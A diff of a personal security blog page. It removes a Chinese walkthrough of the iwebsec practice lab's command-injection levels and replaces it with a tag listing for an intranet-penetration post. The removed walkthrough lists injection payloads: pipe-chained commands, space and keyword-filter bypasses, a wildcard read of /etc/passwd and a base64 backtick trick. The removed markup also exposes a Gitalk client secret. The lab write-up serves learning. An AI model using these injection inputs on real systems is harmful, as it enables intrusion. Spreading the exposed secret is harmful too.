@@ -15,8 +15,8 @@
   
   <title>
     
-      iwebsec_命令执行漏洞 
-      
+      Tag 
+       : 出网探测
       
       |
     
@@ -114,208 +114,30 @@
 
 
       <div class="flex-container">
-        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
-<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+        <!-- 标签详情页，展示某个标签下的文章列表，url形式：https://yoursite/tags/某个标签/ -->
 
-
-  <!-- LaTex Display -->
-
+<div class="container tag-details">
+  <div class="content-title">
+    <h2>
+      <span>出网探测</span>
+    </h2>
+  </div>
   
-    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
-  
-  <script>
-    MathJax = {
-      tex: {
-        inlineMath: [['$', '$'], ['\\(', '\\)']]
-      }
-    }
-  </script>
-
-
-
-
-
-  <!-- clipboard -->
-
-  
-    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
-  
-  
-<script src="/js/codeCopy.js"></script>
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
-  <div class="container post-details" id="post-details">
-    <div class="post-content">
-      <div class="post-title">iwebsec_命令执行漏洞</div>
-      <div class="post-attach">
-        <span class="post-pubtime">
-          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2024-11-29 12:56:43
-        </span>
-        
-              <span class="post-categories">
-                <i class="iconfont icon-bookmark" title="Categories"></i>
-                
-                <span class="span--category">
-                  <a href="/categories/iwebsec/" title="iwebsec">
-                    <b>#</b> iwebsec
-                  </a>
-                </span>
-                
-              </span>
-          
-              <span class="post-tags">
-                <i class="iconfont icon-tags mr-10" title="Tags"></i>
-                
-                <span class="span--tag mr-8">
-                  <a href="/tags/%E9%9D%B6%E5%9C%BA/" title="靶场">
-                    #靶场
-                  </a>
-                </span>
-                
-              </span>
-          
+    <div class="post-list">
+      <div class="post-item" title="内网渗透-出网探测">
+        <span class="time-m-d">2024-11-29</span>
+        <a href="/2024/11/29/%E5%87%BA%E7%BD%91%E6%8E%A2%E6%B5%8B/">
+          <span>内网渗透-出网探测</span>
+        </a>
       </div>
-      <div class="markdown-body">
-        <h4 id="01-命令执行漏洞"><a href="#01-命令执行漏洞" class="headerlink" title="01-命令执行漏洞"></a>01-命令执行漏洞</h4><p><code>?ip=127.0.0.1</code>会返回该地址的信息，猜测使用了某个函数，但是不知道是什么，尝试使用<code>|</code>进行执行多个命令</p>
-<p><code>?ip=127.0.0.1|ls</code></p>
-<p>成功返回目录信息</p>
-<h4 id="02-命令执行空格绕过"><a href="#02-命令执行空格绕过" class="headerlink" title="02-命令执行空格绕过"></a>02-命令执行空格绕过</h4><p><code>Linux</code>系统中可以使用<code>&lt;</code>替代空格</p>
-<p><code>?ip=127.0.0.1|cat&lt;02.php</code></p>
-<p>返回结果在源码中</p>
-<p>绕过空格的方法还有很多，自行查询</p>
-<h4 id="03-命令执行漏洞关键命令绕过"><a href="#03-命令执行漏洞关键命令绕过" class="headerlink" title="03-命令执行漏洞关键命令绕过"></a>03-命令执行漏洞关键命令绕过</h4><p>提示<code>cat</code>被过滤，可以使用<code>nl more</code>等替代</p>
-<p><code>?ip=127.0.0.1|nl 03.php</code></p>
-<h4 id="04-命令执行漏洞通配符绕过"><a href="#04-命令执行漏洞通配符绕过" class="headerlink" title="04-命令执行漏洞通配符绕过"></a>04-命令执行漏洞通配符绕过</h4><p><code>*</code>自动匹配多个字符，如文件夹中含有<code>flag.php</code>，那么可以使用<code>cat fla*</code></p>
-<p><code>?</code>匹配一个字符，<code>cat f?a?.???</code></p>
-<p>看一眼源码想让我们干啥</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  		<span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/etc|passwd/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;error!!!&#x27;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">else</span>&#123;</span><br><span class="line">    		<span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">   			</span><br><span class="line">    	&#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c 2 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">exit</span>();</span><br><span class="line">    		&#125;		</span><br><span class="line">   	<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>不让出现<code>etc|passwd</code>,可以用通配符<code>cat /et?/passw*</code></p>
-<h4 id="05-base64编码绕过"><a href="#05-base64编码绕过" class="headerlink" title="05-base64编码绕过"></a>05-base64编码绕过</h4><p>不知道过滤了什么，但是我们知道可以使用编码绕过即可</p>
-<p>ip&#x3D;127.0.0.1;<code>反引号echo bHM=|base64 -d反引号</code></p>
-<p>注意，只有加了反引号的部分才会被当成命令执行</p>
-
-      </div>
-      
-        <div class="prev-or-next">
-          <div class="post-foot-next">
-            
-              <a href="/2024/04/15/iwebsec_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" target="_self">
-                <i class="iconfont icon-chevronleft"></i>
-                <span>Prev</span>
-              </a>
-            
-          </div>
-          <div class="post-attach">
-            <span class="post-pubtime">
-              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2024-11-29 12:56:43
-            </span>
-            
-                  <span class="post-categories">
-                    <i class="iconfont icon-bookmark" title="Categories"></i>
-                    
-                    <span class="span--category">
-                      <a href="/categories/iwebsec/" title="iwebsec">
-                        <b>#</b> iwebsec
-                      </a>
-                    </span>
-                    
-                  </span>
-              
-                  <span class="post-tags">
-                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
-                    
-                    <span class="span--tag mr-8">
-                      <a href="/tags/%E9%9D%B6%E5%9C%BA/" title="靶场">
-                        #靶场
-                      </a>
-                    </span>
-                    
-                  </span>
-              
-          </div>
-          <div class="post-foot-prev">
-            
-              <a href="/2024/04/15/iwebsec_%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_self">
-                <span>Next</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
-            
-          </div>
-        </div>
-      
     </div>
-    
-  <div id="btn-catalog" class="btn-catalog">
-    <i class="iconfont icon-catalog"></i>
-  </div>
-  <div class="post-catalog hidden" id="catalog">
-    <div class="title">Contents</div>
-    <div class="catalog-content">
-      
-        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#01-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">01-命令执行漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#02-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-text">02-命令执行空格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#03-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%B3%E9%94%AE%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">03-命令执行漏洞关键命令绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#04-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-text">04-命令执行漏洞通配符绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#05-base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">05-base64编码绕过</span></a></li></ol>
-      
-    </div>
-  </div>
-
   
-<script src="/js/catalog.js"></script>
-
-
-
-
+  <nav class="post-navigation">
     
-      <div class="comments-container">
-        
-
-
-
-
-
-
-  <div id="gitalk-container"></div>
-
-  <script>
-    function loadGitalkSuc() {
-      const gitalk = new Gitalk({
-        clientID: 'Ov23licpPbk56RG2QlZ9',
-        clientSecret: '8c17dc4d2de10cbb8846fbd6a9276cc3dc42f9e9',
-        repo: 'Yllxx03.github.io',
-        owner: 'Yllxx03',
-        admin: ['Yllxx03'],
-        id: location.pathname,
-        distractionFreeMode: false
-      })
-
-      gitalk.render('gitalk-container')
-    }
-  </script>
-  
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
-  
-
-
-
-      </div>
+    <span class="page-num">1 / 1</span>
     
-  </div>
-
+  </nav>
+</div>
 
         
 <div class="footer">
@@ -572,24 +394,6 @@
 
 
         
-  
-    <div class="share-icon tools-bar-item">
-      <a href="javascript: void(0)" id="share-icon">
-        <i class="iconfont iconshare"></i>
-      </a>
-      <div class="share-content hidden">
-        
-          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + iwebsec_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E + '&url=' + http%3A%2F%2Fysec.site%2F2024%2F04%2F15%2Fiwebsec_%25E5%2591%25BD%25E4%25BB%25A4%25E6%2589%25A7%25E8%25A1%258C%25E6%25BC%258F%25E6%25B4%259E%2F + '" target="_blank" title="Twitter">
-            <i class="iconfont icon-twitter"></i>
-          </a>
-        
-        
-          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://ysec.site/2024/04/15/iwebsec_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" title="Facebook">
-            <i class="iconfont icon-facebooksquare"></i>
-          </a>
-        
-      </div>
-    </div>
   
   
 <script src="/js/shares.js"></script>
